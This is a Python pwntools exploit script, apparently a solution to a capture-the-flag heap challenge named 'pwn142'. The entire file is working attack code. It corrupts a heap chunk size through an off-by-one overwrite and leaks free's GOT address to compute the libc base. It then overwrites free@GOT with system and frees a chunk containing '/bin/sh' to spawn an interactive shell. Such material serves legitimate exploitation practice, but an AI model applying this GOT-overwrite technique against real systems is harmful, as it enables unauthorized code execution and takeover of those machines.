from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
context.terminal = ['tmux', 'split-window', '-h', '-p', '50', '-c', '#{pane_current_path}']
#io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28243)
GDBSCRIPT = r'''
'''
elf = ELF('./pwn142')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    io = process([elf.path])
    if args.ATTACH:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io

def create(size, content):
    io.recvuntil("choice :")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)


def edit(idx, content):
    io.recvuntil("choice :")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(content)


def show(idx):
    io.recvuntil("choice :")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))


def delete(idx):
    io.recvuntil("choice :")
    io.sendline("4")
    io.recvuntil(":")
    io.sendline(str(idx))

io = start()
create(0x18, "aaaa")  # 0
create(0x10, "bbbb")
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
delete(1)
pause()
create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got['free']))  #1
show(1)
io.recvuntil(b"Content : ")
data = io.recv(6)
free = u64(data.ljust(8, b"\x00"))  
libc_base = free - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1, p64(system_addr))
pause()
delete(0)

io.interactive()